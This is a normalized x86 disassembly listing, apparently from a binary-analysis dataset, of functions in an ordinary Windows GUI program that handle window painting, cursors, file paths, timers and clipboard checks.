lea ebx [ ebx ]
mov edx [ esp + 0xa0 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
mov [ esp + 0x80 ] edx
mov edx [ ecx ]
mov [ esp + 0x7c ] eax
sub eax edx
mov edx [ esp + 0xa8 ]
add eax ebx
mov [ esp + 0x84 ] eax
cmp [ rw-data ] 0x1
mov [ esp + 0x88 ] edx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edx ]
mov ecx [ esp + 0xa0 ]
mov edi [ esp + 0xa8 ]
mov esi ebx
sub esi eax
lea eax [ esp + 0xb0 ]
push 0x0
push eax
sub edi ecx
call sub_40af00
push eax
mov eax [ esp + 0x84 ]
mov edx [ esp + 0xac ]
push 0x0
push 0x0
mov ecx esi
imul ecx eax
dec eax
push edi
imul eax esi
push ecx
mov ecx [ esp + 0x30 ]
push 0x0
push eax
mov eax [ esp + 0x58 ]
push edi
push esi
push edx
push eax
push ecx
mov ecx ebp
call sub_4421e0
mov esi [ esp + 0x3c ]
mov edi [ timeGetTime@IAT ]
jmp r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x98 ]
mov [ esp + 0x7c ] eax
mov eax [ esp + 0x90 ]
mov [ esp + 0x80 ] eax
cmp [ rw-data ] 0x1
mov [ esp + 0x84 ] ecx
mov [ esp + 0x88 ] edx
jne r-xdata
mov edx [ esp + 0x90 ]
mov edi [ esp + 0x34 ]
mov esi [ esp + 0x98 ]
lea ecx [ esp + 0xb0 ]
push 0x0
push ecx
sub esi edx
sub edi eax
call sub_40af00
mov ecx [ esp + 0x34 ]
push eax
mov eax [ esp + 0x9c ]
push 0x0
push 0x0
mov edx edi
imul edx [ esp + 0x8c ]
push esi
push edx
mov edx [ esp + 0x30 ]
push 0x0
push 0x0
push esi
push edi
push eax
push ecx
push edx
mov ecx ebx
call sub_4421e0
mov esi [ timeGetTime@IAT ]
mov edi [ esp + 0x10 ]
jmp r-xdata
call [ GetStockObject@IAT ]
push eax
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x7c ]
push edx
push eax
call [ FillRect@IAT ]
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x8c ]
push eax
push ecx
call sub_45cef0
add esp 0x1c
jmp r-xdata
call edi
mov ecx [ rw-data ]
mov edx eax
sub edx esi
cmp edx ecx
jae r-xdata
call [ GetStockObject@IAT ]
push eax
lea ecx [ esp + 0x7c ]
push ecx
push edi
call [ FillRect@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x8c ]
push eax
push edi
call sub_45cef0
add esp 0x1c
jmp r-xdata
call esi
mov ecx [ rw-data ]
mov edx eax
sub edx ebp
cmp edx ecx
jae r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
sub ecx 0x4
dec eax
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
sub esi eax
add esi ecx
push esi
call [ Sleep@IAT ]
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
sub ecx 0x4
dec eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] eax
jne r-xdata
sub ebp eax
add ebp ecx
push ebp
call [ Sleep@IAT ]
call edi
mov ecx [ esp + 0x44 ]
test ecx ecx
mov esi eax
mov [ esp + 0x3c ] esi
mov eax 0x1
jne r-xdata
call esi
mov edx [ esp + 0x88 ]
mov ebx [ esp + 0x40 ]
mov ebp eax
mov eax [ esp + 0x24 ]
mov eax [ eax ]
add eax edx
test ebx ebx
mov [ esp + 0x28 ] eax
push 0x0
je r-xdata
mov eax [ esp + 0x64 ]
mov edi [ esp + 0x50 ]
mov [ esp + 0x28 ] eax
sub_4863a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1394
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa54
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xa74 ]
test edi edi
mov eax 0x2
mov [ rw-data ] eax
je r-xdata
mov ecx [ esp + 0xa64 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xa60
retn
mov eax [ rw-data ]
push eax
call [ SetCapture@IAT ]
push 0x7f02
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ esp + 0xa80 ]
test eax eax
jg r-xdata
lea esi [ esp + 0x14 ]
xor ecx ecx
mov [ esp + 0x13 ] 0x0
mov eax edi
sub esi edi
nop
mov ecx [ rw-data ]
mov [ esp + 0xa80 ] ecx
push r--data
lea edx [ esp + 0x18 ]
push edx
mov [ esp + ecx + 0x1c ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
inc ecx
mov [ esi + eax ] dl
inc eax
cmp ecx 0x7
jl r-xdata
mov ebx [ SetErrorMode@IAT ]
push 0x1
call ebx
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov [ esp + 0x13 ] 0x1
mov dl [ eax ]
test dl dl
je r-xdata
push eax
call [ SetCurrentDirectoryA@IAT ]
push 0x0
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax rw-data
mov al [ esp + 0x13 ]
test al al
mov ebp [ lstrlenA@IAT ]
jne r-xdata
mov eax [ rw-data ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov ecx [ eax ]
mov eax [ rw-data ]
test ecx ecx
mov ecx [ rw-data ]
mov esi ecx
je r-xdata
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
xor edi edi
cmp eax edi
je r-xdata
mov edx [ esp + 0xa74 ]
push edx
call ebp
mov esi eax
test esi esi
jne r-xdata
cmp ecx eax
jne r-xdata
mov esi eax
mov esi 0xf
mov [ rw-data ] edi
mov [ esp + 0x58 ] esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x44 ] 0x0
cmp [ rw-data ] edi
mov [ esp + 0xa6c ] edi
je r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
mov [ rw-data ] edi
mov edx [ esp + 0xa74 ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
push 0x800
push edx
call [ GetFullPathNameA@IAT ]
lea eax [ esp + 0x5c ]
push eax
call ebp
mov edi eax
lea ecx [ esi + 0x1 ]
cmp ecx edi
jge r-xdata
call [ ReleaseCapture@IAT ]
push 0x7f00
push esi
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ rw-data ]
jmp r-xdata
push esi
call [ SetFocus@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetForegroundWindow@IAT ]
cmp [ rw-data ] edi
push 0xffffffff
lea ecx [ esp + 0x44 ]
push edi
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ esp + 0x4c ]
call sub_401dd0
cmp esi edi
jne r-xdata
mov edx [ esp + 0xa74 ]
push edx
call sub_457f00
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov eax [ esp + 0xa74 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
mov ecx [ esp + 0xa74 ]
push ecx
lea edx [ esp + 0x60 ]
push edx
jmp r-xdata
lea eax [ esp + 0x5c ]
push eax
call sub_457f00
add esp 0x4
test eax eax
jne r-xdata
dec esi
push r--data
lea edx [ esp + 0x60 ]
push edx
call ebp
lea ecx [ esp + 0x60 ]
sub ecx 0x4
add eax ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
lea edx [ esp + 0x5c ]
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
nop
call sub_401dd0
call sub_46fe50
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov edx [ esp + 0xa78 ]
push edx
lea eax [ esp + 0x60 ]
push eax
call sub_4580e0
add esp 0x8
call [ lstrcpyA@IAT ]
mov edx [ esp + 0xa74 ]
lea ecx [ esi + 0x1 ]
push ecx
sub edi esi
push edx
lea eax [ esp + edi + 0x64 ]
push eax
call [ lstrcpynA@IAT ]
jmp r-xdata
dec edi
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
push edx
call sub_4024d0
call sub_405090
add esp 0x1c
cmp eax edi
mov [ rw-data ] eax
je r-xdata
push edi
push edi
push 0x1
push 0x1
push edx
push 0x2
call sub_423c30
mov ebx [ esp + 0xa90 ]
lea eax [ esp + 0x74 ]
push eax
push edi
push edi
push ebx
mov [ rw-data ] 0x1c
call sub_483370
add esp 0x28
mov ecx rw-data
mov esi eax
call sub_401420
cmp esi edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx rw-data
call sub_401e80
mov [ rw-data ] 0x5
push r--data
lea edx [ esp + 0x60 ]
push edx
call ebp
lea ecx [ esp + 0x60 ]
sub ecx 0x4
add eax ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x5c ]
push ecx
mov ecx rw-data
cmp eax 0x5
jle r-xdata
mov ecx [ rw-data ]
cmp ecx edi
je r-xdata
mov ecx [ rw-data ]
push edi
push r--data
push r--data
push ecx
mov [ rw-data ] edi
call [ MessageBoxA@IAT ]
jmp r-xdata
mov edi [ rw-data ]
mov eax [ eax ]
test eax eax
mov edi eax
jge r-xdata
mov ebx 0x10
mov eax [ rw-data ]
mov ebx 0x10
cmp eax ebx
mov eax [ rw-data ]
jae r-xdata
lea eax [ esp + 0x5c ]
push eax
mov ecx rw-data
jmp r-xdata
cmp eax 0x7
jg r-xdata
lea edx [ esp + 0x5c ]
push rw-data
push edx
call sub_462e20
add esp 0x8
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push edi
push ebx
call sub_466930
xor eax eax
add esp 0x18
cmp esi edi
sete al
mov [ rw-data ] eax
call [ ReleaseCapture@IAT ]
push 0x7f00
push edi
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov esi [ rw-data ]
lea ecx [ esp + 0x40 ]
call sub_4480e0
mov eax esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi [ esp + 0xa74 ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_404550
add esp 0x4
test eax eax
jne r-xdata
mov eax rw-data
call sub_402510
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
mov [ esp + 0xa74 ] 0x1
call sub_462ec0
add esp 0x8
mov ebp 0x1
push ebp
call ebx
sub esp 0x1c
lea edx [ esp + 0x40 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push edx
call sub_401fc0
call sub_405090
mov esi eax
lea eax [ esp + 0x78 ]
push eax
call sub_439280
add esp 0x20
push 0x0
mov edi eax
call ebx
cmp esi 0x7
je r-xdata
mov edx [ rw-data ]
mov ebp [ eax + 0x380 ]
and edx 0x7
cmp edx ebp
jne r-xdata
cmp [ rw-data ] ebx
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] ebx
jb r-xdata
push 0xb4
call sub_4b573e
add esp 0x4
mov [ esp + 0x14 ] eax
test eax eax
mov [ esp + 0xa6c ] 0x2
je r-xdata
push rw-data
push eax
call sub_462e20
add esp 0x8
jmp r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov ecx rw-data
call sub_401420
mov eax [ rw-data ]
cmp eax 0x6
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jne r-xdata
cmp esi 0x6
je r-xdata
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
push edx
push 0x100e
push ecx
mov [ esp + 0x24 ] edi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
push edi
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ InvalidateRect@IAT ]
mov [ rw-data ] edi
mov [ rw-data ] 0xffffffff
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
xor eax eax
mov edx [ rw-data ]
push edx
push rw-data
push esi
mov ecx eax
call sub_403030
jmp r-xdata
mov eax [ esp + 0xa8c ]
test eax eax
je r-xdata
mov eax rw-data
cmp esi 0x6
mov ecx rw-data
jne r-xdata
cmp edi 0x7
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x7
jne r-xdata
mov ecx [ rw-data ]
mov [ eax + 0x90 ] ecx
mov edx [ rw-data ]
lea eax [ esp + 0x5c ]
mov [ edx + 0x24 ] edi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
call [ ReleaseCapture@IAT ]
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
cmp [ esp + 0x58 ] ebx
mov [ rw-data ] 0xffffffff
jb r-xdata
test eax eax
mov [ esp + 0xa6c ] 0x0
mov [ rw-data ] eax
jne r-xdata
lea eax [ esp + 0x5c ]
push eax
call sub_402510
lea ecx [ esp + 0x5c ]
push ecx
lea edx [ esp + 0x860 ]
push r--data
push edx
mov [ rw-data ] 0x12d
call [ wsprintfA@IAT ]
mov [ rw-data ] 0x2
cmp eax 0x7
jne r-xdata
lea edx [ esp + 0x5c ]
push edx
mov ecx rw-data
call sub_402510
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0x860 ]
push r--data
push ecx
mov [ rw-data ] 0x135
call [ wsprintfA@IAT ]
mov [ rw-data ] ebp
jmp r-xdata
cmp eax 0x6
jne r-xdata
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push eax
lea eax [ esp + 0x60 ]
push eax
add ecx 0x2c
call sub_401e80
mov ecx [ rw-data ]
mov edx [ esp + 0xa7c ]
mov [ ecx + 0x48 ] edx
mov eax [ rw-data ]
mov ecx [ esp + 0xa80 ]
mov [ eax + 0x4c ] ecx
mov edx [ rw-data ]
mov al [ esp + 0xa84 ]
mov [ edx + 0x50 ] al
mov ecx [ rw-data ]
mov dl [ esp + 0xa88 ]
mov eax [ esp + 0xa98 ]
mov [ ecx + 0x51 ] dl
mov ecx [ rw-data ]
mov [ ecx + 0x8c ] eax
mov eax [ esp + 0xa90 ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
push sub_45ba40
push 0x1388
push 0x3
push ecx
call [ SetTimer@IAT ]
mov edx [ esp + 0xa78 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
mov [ rw-data ] eax
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x85c ]
push ecx
push edx
call [ SetWindowTextA@IAT ]
call [ ReleaseCapture@IAT ]
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov esi [ rw-data ]
lea ecx [ esp + 0x24 ]
call sub_4480e0
lea ecx [ esp + 0x40 ]
call sub_4480e0
mov eax esi
jmp r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
lea eax [ esp + 0x5c ]
push eax
call sub_402510
push 0xffffffff
push 0x0
lea edx [ esp + 0x2c ]
push edx
call sub_401dd0
jmp r-xdata
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
test esi esi
jne r-xdata
cmp edi 0x7
je r-xdata
lea edx [ esp + 0x5c ]
push edx
call sub_457f40
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0xa94 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push eax
add ecx 0x54
call sub_402510
lea ecx [ esp + 0x5c ]
push ecx
lea edx [ esp + 0x860 ]
push r--data
push edx
mov [ rw-data ] 0x133
call [ wsprintfA@IAT ]
mov [ rw-data ] ebp
jmp r-xdata
push 0xffffffff
push esi
lea ecx [ esp + 0x2c ]
push ecx
mov ecx rw-data
call sub_401dd0
lea ecx [ esp + 0x24 ]
mov [ rw-data ] esi
mov [ esp + 0xa6c ] 0x0
call sub_4480e0
jmp r-xdata
dec eax
push eax
lea ecx [ esp + 0x60 ]
push ecx
mov ecx rw-data
call sub_401e80
push 0xffffffff
push eax
lea eax [ esp + 0x2c ]
push eax
mov ecx rw-data
call sub_401dd0
jmp r-xdata
mov edx [ rw-data ]
mov al [ esp + 0xa9c ]
mov [ edx + 0x28 ] al
mov ecx [ rw-data ]
mov [ ecx + 0x29 ] 0x1
mov edx [ rw-data ]
push edx
call sub_4090d0
add esp 0x4
mov ecx rw-data
call sub_401420
call [ ReleaseCapture@IAT ]
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
cmp [ esp + 0x58 ] ebx
mov [ rw-data ] 0x0
jb r-xdata
mov ecx [ rw-data ]
push eax
add ecx 0x70
call sub_402510
mov eax [ rw-data ]
test eax eax
je r-xdata
sub esp 0x1c
lea edx [ esp + 0x78 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push edx
call sub_4024d0
call sub_401530
add esp 0x1c
cmp eax 0x6
je r-xdata
sub esp 0x1c
lea eax [ esp + 0x78 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push eax
call sub_4024d0
call sub_401530
add esp 0x1c
cmp eax 0x6
jne r-xdata
lea edx [ esp + 0x24 ]
push edx
push rw-data
call sub_4013c0
add esp 0x8
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x24 ]
mov [ esp + 0xa6c ] 0x0
call sub_4480e0
jmp r-xdata
lea eax [ esp + 0x5c ]
push eax
mov ecx rw-data
call sub_402510
push 0xffffffff
push 0x0
lea ecx [ esp + 0x2c ]
push ecx
mov ecx rw-data
call sub_401dd0
lea ecx [ esp + 0x24 ]
mov [ rw-data ] esi
mov [ esp + 0xa6c ] 0x0
call sub_4480e0
jmp r-xdata
sub_486df0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c13b8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push ebp
push esi
mov esi [ esp + 0x70 ]
push edi
push esi
call sub_45b5d0
add esp 0x4
test esi esi
mov edi eax
je r-xdata
cmp esi [ rw-data ]
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp edi 0x4
je r-xdata
test esi esi
jne r-xdata
cmp esi 0xc
jge r-xdata
cmp edi 0x4
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp esi 0x1c
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov ecx rw-data
call sub_404310
cmp esi 0x1b
mov edx [ esp + 0x80 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov ebp [ rw-data ]
push 0x0
push edx
push eax
mov [ rw-data ] 0x1
push ecx
jne r-xdata
call sub_43d200
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov cl [ eax + rw-data ]
test cl cl
jne r-xdata
mov ecx [ esp + 0x64 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x60
retn
jmp r-xdata
mov [ rw-data ] esi
call sub_483370
add esp 0x10
cmp eax 0x1
je r-xdata
mov [ rw-data ] esi
call sub_483370
push 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebp
call sub_4290f0
add esp 0x14
jmp r-xdata
mov ecx rw-data
call sub_404310
mov ecx rw-data
mov [ rw-data ] 0x1
call sub_401420
cmp esi [ rw-data ]
jne r-xdata
call sub_43d290
push 0x0
push eax
call sub_4221d0
add esp 0x8
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call sub_466930
add esp 0x18
mov [ rw-data ] edi
mov [ rw-data ] ebp
mov ecx rw-data
call sub_401420
mov eax [ rw-data ]
mov edi 0x10
push ecx
cmp eax edi
mov eax [ rw-data ]
mov ecx esp
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
add eax edx
mov [ ecx ] eax
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
mov eax esp
jae r-xdata
mov eax rw-data
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_401dd0
mov [ eax ] ecx
lea eax [ esp + 0x7c ]
push eax
mov ecx rw-data
call sub_401c60
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
mov eax esp
jae r-xdata
mov ecx rw-data
mov edx [ rw-data ]
add ecx edx
mov [ eax ] ecx
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
mov eax esp
jae r-xdata
mov ecx rw-data
mov [ eax ] ecx
lea eax [ esp + 0x7c ]
push eax
mov ecx rw-data
call sub_401c60
mov edi [ rw-data ]
cmp esi edi
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] edi
mov [ rw-data ] 0x0
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
jne r-xdata
mov ecx rw-data
cmp [ rw-data ] 0x2
mov esi [ esp + 0x7c ]
jne r-xdata
mov ecx [ rw-data ]
push 0x1
push 0x0
push 0xffffffff
push ecx
call sub_485220
add esp 0x10
mov ecx [ esp + 0x64 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
mov [ rw-data ] 0x0
test esi esi
jne r-xdata
cmp edi 0xc
jge r-xdata
mov ecx [ rw-data ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x74 ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x1
jne r-xdata
cmp esi 0xffffffff
jne r-xdata
or ebx 0xffffffff
cmp edi 0xc
jl r-xdata
mov ebp [ rw-data ]
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
push 0x1
push 0x0
push esi
push ecx
call sub_485220
add esp 0x10
mov ecx [ esp + 0x64 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
xor esi esi
xor eax eax
mov [ rw-data ] eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] al
imul esi esi 0x1c
lea edi [ esi + ebp ]
mov [ esp + 0x6c ] eax
mov eax [ edi + 0x18 ]
mov ebp 0x10
cmp eax ebp
jb r-xdata
cmp edi 0x1b
jg r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
lea eax [ edi - 0xc ]
cdq
and edx 0x3
add eax edx
mov ebx eax
sar ebx 0x2
push 0xffffffff
push 0x0
push edi
lea ecx [ esp + 0x1c ]
call sub_401dd0
push r--data
lea ecx [ esp + 0x4c ]
push rw-data
push ecx
call sub_402140
mov edx [ rw-data ]
lea ecx [ esi + edx ]
push ecx
push eax
lea eax [ esp + 0x40 ]
push eax
mov [ esp + 0x84 ] 0x1
call sub_420e80
add esp 0x18
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x78 ] 0x2
call sub_401dd0
lea ecx [ esp + 0x2c ]
call sub_4480e0
lea ecx [ esp + 0x48 ]
mov [ esp + 0x6c ] 0x0
call sub_4480e0
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
jne r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push eax
push ebx
call sub_423380
add esp 0x14
lea ecx [ esp + 0x10 ]
call sub_4480e0
mov ecx [ esp + 0x64 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
lea eax [ esp + 0x14 ]
cmp [ esp + 0x28 ] ebp
mov eax [ esp + 0x14 ]
jae r-xdata
sub_487240
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push ebp
xor ebp ebp
mov eax 0x2
cmp ecx eax
push esi
mov [ rw-data ] ebp
jne r-xdata
mov eax [ rw-data ]
cmp eax ebp
mov [ rw-data ] 0x1
je r-xdata
mov esi [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
inc esi
cmp esi eax
jge r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] 0x0
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
push 0x1
push 0x0
push 0xffffffff
push ebx
call sub_485220
add esp 0x10
pop esi
pop ebp
pop ebx
retn
lea esp [ esp ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
push edi
mov edi [ ecx + eax * 4 ]
cmp edi ebp
je r-xdata
mov eax [ rw-data ]
inc esi
cmp esi eax
jl r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
inc [ edi + 0xd48 ]
push ebp
push 0x1
push ebx
push esi
call sub_4706c0
add esp 0x10
cmp eax ebp
jge r-xdata
push 0x1
push 0x0
push 0xffffffff
push ebx
call sub_485220
add esp 0x10
pop esi
pop ebp
pop ebx
retn
mov [ rw-data ] edi
pop edi
push 0x1
push 0x0
push 0xffffffff
push ebx
mov [ rw-data ] esi
call sub_485220
add esp 0x10
pop esi
pop ebp
pop ebx
retn
mov edx [ eax + 0xd48 ]
mov ebp eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_487370
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c13e3
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push 0x8
call [ IsClipboardFormatAvailable@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
push eax
mov eax [ esp + 0x1c ]
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ rw-data ]
push edi
push edx
call [ EnableWindow@IAT ]
mov ecx rw-data
mov [ esp + 0x14 ] ecx
call sub_404310
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea esi [ eax * 4 ]
mov ebx eax
mov [ esi + ecx ] eax
mov eax [ rw-data ]
cmp eax edi
mov [ esp + 0x20 ] edi
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x10 ] edx
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
call sub_46fe50
mov [ rw-data ] edi
mov [ rw-data ] edi
test edi edi
mov edx [ rw-data ]
mov [ esp + 0x20 ] 0x0
lea ebp [ esi + edx ]
je r-xdata
mov ecx eax
call sub_43fd90
mov edi eax
mov eax [ rw-data ]
inc eax
xor edx edx
div ecx
push 0xd50
mov [ rw-data ] ebx
mov [ rw-data ] edx
call sub_4b573e
add esp 0x4
mov [ esp + 0x10 ] eax
cmp eax edi
mov [ esp + 0x20 ] 0x1
je r-xdata
mov ecx [ ebp ]
test ecx ecx
mov [ esp + 0x10 ] ecx
je r-xdata
inc [ edi + 0xd48 ]
mov [ ebp ] edi
mov ecx [ rw-data ]
mov ecx [ esi + ecx ]
push ebx
call sub_43e520
test eax eax
jne r-xdata
dec [ ecx + 0xd48 ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x28 ]
push eax
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] 0xffffffff
mov ecx rw-data
mov [ esi + eax ] 0xffffffff
call sub_401420
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
call sub_43fe30
mov eax [ esp + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax edx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x20 ] 0xffffffff
call sub_401420
mov ecx [ rw-data ]
mov edx [ esp + 0x28 ]
push 0x1
push 0x0
dec ecx
push ecx
push edx
call sub_485220
mov eax [ rw-data ]
push eax
call sub_466150
mov ecx [ rw-data ]
add esp 0x14
push 0x1
push ecx
call [ EnableWindow@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
shl edx 0x10
or edx 0x1
push edx
push 0x1
push 0x406
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
test ecx ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
sub edx ecx
sar edx 0x2
mov [ rw-data ] edx
mov [ rw-data ] ecx
jmp r-xdata
sub_4875e0
mov eax [ esp + 0x8 ]
sub esp 0x120
sub eax 0x110
push esi
je r-xdata
mov ecx [ rw-data ]
mov esi [ GetWindowRect@IAT ]
push edi
